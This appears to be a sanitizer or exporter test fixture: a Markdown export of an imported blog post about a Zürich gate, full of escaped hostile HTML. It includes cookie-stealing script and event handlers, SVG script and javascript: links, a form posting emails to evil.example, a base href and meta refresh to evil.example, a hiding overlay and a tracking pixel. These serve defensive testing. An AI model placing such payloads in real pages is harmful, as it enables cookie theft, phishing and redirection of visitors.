# Hostile HTML — an imported legacy post

Canonical: <https://example.test/blog/hostile-html/>

&lt;base href="https://evil.example/"&gt;
&lt;meta http-equiv="refresh" content="0;url=https://evil.example/"&gt;

## Overview

An imported post keeps its &lt;abbr title="HyperText Markup Language"&gt;HTML&lt;/abbr&gt;, its
&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;K&lt;/kbd&gt; shortcuts, and its &lt;a href="../glossary/"&gt;relative links&lt;/a&gt;, while
&lt;span onclick="steal()" onmouseover="steal()"&gt;event handlers&lt;/span&gt; and
&lt;a href="https://partner.example/" target="_blank" rel="noopener"&gt;link targets&lt;/a&gt; go. Inline
code in &lt;script&gt;steal(document.cookie)&lt;/script&gt; tags is dropped.

&lt;figure id="gate-plan"&gt;
&lt;img src="images/gate-plan.png" alt="Plan of the Zürich gate" width="640" height="360" srcset="images/gate-plan@2x.png 2x"&gt;
&lt;figcaption&gt;The gate plan, from the &lt;cite&gt;Stadtarchiv Zürich&lt;/cite&gt;.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;details id="overview"&gt;&lt;summary&gt;Archive notes&lt;/summary&gt;

The &lt;q cite="/sources/annals/"&gt;annals&lt;/q&gt; mention the gate twice.
See [the plan](https://example.test/blog/hostile-html/#gate-plan) and &lt;a href="#archive-anchor"&gt;the archive anchor&lt;/a&gt;.

&lt;/details&gt;

&lt;a name="archive-anchor"&gt;Box 12, folder 3&lt;/a&gt; holds the original survey.

&lt;table&gt;
&lt;thead&gt;&lt;tr&gt;&lt;th scope="col"&gt;Year&lt;/th&gt;&lt;th scope="col"&gt;Event&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;1350&lt;/td&gt;&lt;td&gt;Bridge built &lt;sup&gt;(uncertain)&lt;/sup&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;

&lt;iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ" title="Gate of Embers trailer" allowfullscreen&gt;&lt;/iframe&gt;

&lt;svg viewBox="0 0 10 10" aria-label="Bridge outline"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href="javascript:alert(1)"&gt;&lt;text&gt;x&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;

&lt;form action="https://evil.example/collect"&gt;&lt;label&gt;Email &lt;input type="email" name="email"&gt;&lt;/label&gt;&lt;button type="submit"&gt;Subscribe&lt;/button&gt;&lt;/form&gt;

&lt;div style="position:fixed;inset:0" class="overlay"&gt;&lt;p&gt;Unclosed &lt;b&gt;bold and &lt;i&gt;italic&lt;/p&gt;&lt;/div&gt;

&lt;ob-quiz data-correct="b"&gt;
&lt;p&gt;A hand-written custom element keeps its text.&lt;/p&gt;
&lt;/ob-quiz&gt;

&lt;style&gt;body { display: none }&lt;/style&gt;
&lt;noscript&gt;&lt;img src="https://tracker.example/pixel.gif" alt="tracking"&gt;&lt;/noscript&gt;
> **Portable export note:** 50 raw HTML fragment(s) are shown as literal source because this Markdown export does not execute or preserve raw HTML. View the [canonical article](https://example.test/blog/hostile-html/).

> **Portable fallback:** Authored raw HTML is constrained by the portable allowlist and may be shown as literal source. Review: Review the static fallback in the destination preview.

